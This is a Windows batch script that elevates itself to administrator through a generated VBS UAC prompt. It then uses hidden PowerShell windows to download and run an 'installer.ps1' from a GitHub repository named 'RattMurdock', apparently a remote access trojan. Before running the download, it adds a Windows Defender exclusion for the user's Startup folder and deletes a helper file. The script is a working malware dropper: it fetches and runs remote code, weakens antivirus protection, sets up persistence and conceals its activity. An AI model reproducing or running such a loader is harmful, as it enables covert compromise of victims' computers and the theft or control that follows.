REM get admin permissions for script
@echo off
:: BatchGotAdmin
:-------------------------------------
REM  --> check for permissions
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

REM --> if error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"

REM Download the installer.ps1 script from GitHub using PowerShell
powershell -NoProfile -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Zeyadm8112/RattMurdock/main/installer.ps1' -OutFile 'installer.ps1'"

REM Add exclusion path for Windows Defender using PowerShell
powershell -NoProfile -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'"

REM Run the downloaded installer.ps1 script using PowerShell
powershell -NoProfile -WindowStyle Hidden -File "installer.ps1"


@REM del installer.ps1
del wget.cmd

exit



REM Download the installer.ps1 script from GitHub
